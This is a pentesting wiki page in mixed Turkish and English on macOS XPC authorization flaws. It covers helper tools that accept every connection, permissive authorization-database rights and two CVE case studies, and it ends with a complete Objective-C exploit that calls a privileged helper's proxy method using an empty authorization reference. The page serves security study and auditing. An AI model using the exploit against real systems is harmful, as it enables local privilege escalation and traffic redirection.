# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple ayrıca, bağlanan sürecin **permissions to call the an exposed XPC method** sahibi olup olmadığını doğrulayarak başka bir kimlik doğrulama yöntemi önerir.

When an application needs to **execute actions as a privileged user**, uygulamayı ayrıcalıklı bir kullanıcı olarak çalıştırmak yerine genellikle bu işlemleri gerçekleştirmek için uygulamadan çağrılabilecek bir XPC servisi olarak root altında bir HelperTool kurar. Ancak, servisi çağıran uygulamanın yeterli yetkilendirmeye sahip olması gerekir.

### ShouldAcceptNewConnection always YES

An example could be found in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` dosyasında **bağlanmaya çalışır** **HelperTool**'a. Ve `HelperTool/HelperTool.m` dosyasında fonksiyon **`shouldAcceptNewConnection`** daha önce belirtilen gereksinimlerin hiçbirini **kontrol etmez**. Her zaman YES döndürecektir:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
For more information about how to properly configure this check:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Uygulama hakları

Bununla birlikte, HelperTool'dan bir metot çağrıldığında bazı **yetkilendirme işlemleri** gerçekleşir.

`App/AppDelegate.m` içindeki **`applicationDidFinishLaunching`** fonksiyonu uygulama başladıktan sonra boş bir yetkilendirme referansı oluşturur. Bu her zaman çalışmalıdır.\
Sonrasında, `setupAuthorizationRights` çağırarak bu yetkilendirme referansına **bazı haklar eklemeye** çalışır:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Common/Common.m içindeki `setupAuthorizationRights` fonksiyonu uygulamanın haklarını kimlik doğrulama veritabanı `/var/db/auth.db` içine kaydedecektir. Veritabanında henüz olmayan hakları ekleyeceğine dikkat edin:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Uygulamaların izinlerini almak için kullanılan fonksiyon `enumerateRightsUsingBlock` olup, bunlar `commandInfo` içinde tanımlanmıştır:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Bu, bu işlemin sonunda `commandInfo` içinde bildirilen izinlerin `/var/db/auth.db` içinde saklanacağı anlamına gelir. Orada doğrulama gerektirecek **her yöntem** için **izin adı** ve **`kCommandKeyAuthRightDefault`**'ı bulabileceğinizi unutmayın. Sonuncusu **bu hakkı kimin alabileceğini gösterir**.

Bir hakkın kim tarafından erişilebileceğini belirtmek için farklı kapsamlar vardır. Bunların bazıları [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) içinde tanımlıdır (tümünü [burada](https://www.dssw.co.uk/reference/authorization-rights/) bulabilirsiniz), ama özetle:

<table><thead><tr><th width="284.3333333333333">Ad</th><th width="165">Value</th><th>Açıklama</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Herkes</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Hiç kimse</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Mevcut kullanıcı admin (admin grubunda) olmalıdır</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Kullanıcıdan kimlik doğrulaması istenir.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Kullanıcıdan kimlik doğrulaması istenir. Kullanıcının admin (admin grubunda) olması gerekir</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Kuralları belirtir</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Hak ile ilgili bazı ek yorumlar belirtir</td></tr></tbody></table>

### Hak Doğrulama

`HelperTool/HelperTool.m` içindeki fonksiyon **`readLicenseKeyAuthorization`**, çağıranın **böyle bir yöntemi yürütme** yetkisine sahip olup olmadığını kontrol etmek için **`checkAuthorization`** fonksiyonunu çağırır. Bu fonksiyon, çağıran süreç tarafından gönderilen **`authData`**'nın **doğru bir biçime** sahip olup olmadığını kontrol eder ve ardından belirli yöntemi çağırmak için **hakkı elde etmek için nelerin gerektiğini** denetler. Her şey yolunda giderse döndürülen **`error` `nil` olacaktır`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Şunu unutmayın: bu yöntemi çağırmak için hak elde etme gereksinimlerini **kontrol etmek** amacıyla `authorizationRightForCommand` fonksiyonu yalnızca daha önce bahsedilen nesne **`commandInfo`**'yu kontrol eder. Ardından, fonksiyonu çağırma **haklarına sahip olup olmadığını** kontrol etmek için **`AuthorizationCopyRights`** çağrılır (bayrakların kullanıcı ile etkileşime izin verdiğini unutmayın).

Bu durumda, `readLicenseKeyAuthorization` fonksiyonunu çağırmak için `kCommandKeyAuthRightDefault` `@kAuthorizationRuleClassAllow` olarak tanımlanmıştır. Yani **herkes çağırabilir**.

### DB Bilgileri

Bu bilgilerin `/var/db/auth.db` içinde saklandığı belirtilmişti. Tüm saklı kuralları şu şekilde listeleyebilirsiniz:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Sonra, bu yetkiye kimlerin erişebileceğini şu şekilde okuyabilirsiniz:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Hoşgörülü haklar

Tüm izin yapılandırmalarını [**in here**](https://www.dssw.co.uk/reference/authorization-rights/) adresinde bulabilirsiniz, ancak user etkileşimi gerektirmeyecek kombinasyonlar şunlardır:

1. **'authenticate-user': 'false'**
- Bu en doğrudan anahtar. Eğer `false` olarak ayarlanırsa, bu hakkı elde etmek için bir user'ın kimlik doğrulaması sağlaması gerekmediğini belirtir.
- Bu, **aşağıdaki 2 seçenekten biriyle veya user'ın ait olması gereken bir grup belirtilmesiyle birlikte kullanılır**.
2. **'allow-root': 'true'**
- Eğer bir user root user olarak işlem yapıyorsa (yükseltilmiş izinlere sahip olan), ve bu anahtar `true` olarak ayarlanmışsa, root user bu hakkı ek bir kimlik doğrulama olmadan elde edebilir. Ancak genellikle root user statüsüne ulaşmak zaten kimlik doğrulama gerektirdiğinden, bu çoğu user için "no authentication" senaryosu değildir.
3. **'session-owner': 'true'**
- `true` olarak ayarlanırsa, session owner (o an oturum açmış olan user) otomatik olarak bu hakkı alır. Bu, user zaten oturum açmışsa ek kimlik doğrulamayı atlayabilir.
4. **'shared': 'true'**
- Bu anahtar kimlik doğrulamadan hak vermez. Bunun yerine, `true` olarak ayarlanırsa, bir hak doğrulandığında her süreç için tekrar doğrulama gerekmeksizin birden fazla süreç arasında paylaşılabileceği anlamına gelir. Ancak hakkın ilk verilmesi yine kimlik doğrulama gerektirir; `'authenticate-user': 'false'` gibi diğer anahtarlarla birleştirilmedikçe.

İlginç hakları almak için [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) kullanabilirsiniz:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Yetki Atlatma Vaka İncelemeleri

- **CVE-2024-4395 – Jamf Compliance Editor helper**: Bir denetim çalıştırıldığında `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` bırakıyor, Mach servisi `com.jamf.complianceeditor.helper`'ı açığa çıkarıyor ve çağıranın `AuthorizationExternalForm`'unu veya kod imzasını doğrulamadan `-executeScriptAt:arguments:then:` metodunu dışa aktarıyor. Basit bir exploit `AuthorizationCreate` ile boş bir referans oluşturur, `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` ile bağlanır ve root olarak rastgele ikili dosyaları çalıştırmak için ilgili metodu çağırır. Tam tersine mühendislik notları (ve PoC) için [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 ve 7.4.0–7.4.2, yetkilendirme kontrolleri olmayan ayrıcalıklı helper'a ulaşan hazırlanmış XPC mesajlarını kabul ediyordu. Helper kendi ayrıcalıklı `AuthorizationRef`'ine güvendiği için, servise mesaj gönderebilen herhangi bir yerel kullanıcı helper'ı rastgele yapılandırma değişikliklerini veya komutları root olarak çalıştırmaya zorlayabiliyordu. Detaylar için [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Hızlı ön değerlendirme ipuçları

- Bir uygulama hem GUI hem helper ile dağıtıldığında, kod gereksinimlerinin farklarını diff edin ve `shouldAcceptNewConnection`'ın listener'ı `-setCodeSigningRequirement:` ile kilitlediğini (veya `SecCodeCopySigningInformation`'ı doğruladığını) kontrol edin. Eksik kontroller genellikle Jamf vakasına benzer CWE-863 senaryolarına yol açar. Kısa bir bakış şöyle görünür:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Yardımcının *yetkilendirdiğini düşündüğü şeyi* istemcinin sağladığıyla karşılaştırın. Tersine mühendislik yaparken, `AuthorizationCopyRights` üzerinde kesme noktası koyun ve `AuthorizationRef`'in helper’ın kendi ayrıcalıklı bağlamından değil, istemci tarafından sağlanan `AuthorizationCreateFromExternalForm`'dan kaynaklandığını doğrulayın; aksi halde yukarıdaki vakalara benzer bir CWE-863 desenine rastlamış olabilirsiniz.

## Yetkilendirmeyi Tersine Çevirme

### EvenBetterAuthorization'ın kullanılıp kullanılmadığını kontrol etme

Eğer şu fonksiyonu bulursanız: **`[HelperTool checkAuthorization:command:]`** muhtemelen süreç daha önce bahsedilen yetkilendirme şemasını kullanıyordur:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Bununla birlikte, bu fonksiyon `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` gibi fonksiyonları çağırıyorsa, [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) kullanılıyor demektir.

Kullanıcı etkileşimi olmadan bazı ayrıcalıklı işlemleri çağırma izni almanın mümkün olup olmadığını görmek için **`/var/db/auth.db`** dosyasını kontrol edin.

### Protokol İletişimi

Ardından, XPC servisiyle iletişim kurabilmek için protokol şemasını bulmanız gerekir.

**`shouldAcceptNewConnection`** fonksiyonu dışa aktarılan protokolü gösterir:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Bu durumda, EvenBetterAuthorizationSample'daki ile aynı, [**bu satıra bakın**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Kullanılan protokolün adını bildiğinizde, **dump its header definition** ile başlık tanımını dökmek mümkündür:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Son olarak, onunla iletişim kurabilmek için açığa çıkmış **Mach Service**'in ismini bilmemiz gerekiyor. Bunu bulmanın birkaç yolu var:

- **`[HelperTool init]`** içinde Mach Service'in kullanıldığını görebileceğiniz yer:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist içinde:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Örneği

Bu örnekte şunlar oluşturulur:

- Fonksiyonları içeren protokolün tanımı
- Erişim istemek için kullanılacak boş bir auth
- XPC servisine bir bağlantı
- Bağlantı başarılıysa fonksiyonun çağrılması
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Diğer XPC privilege yardımcılarının kötüye kullanılması

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Kaynaklar

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)

{{#include ../../../../../banners/hacktricks-training.md}}
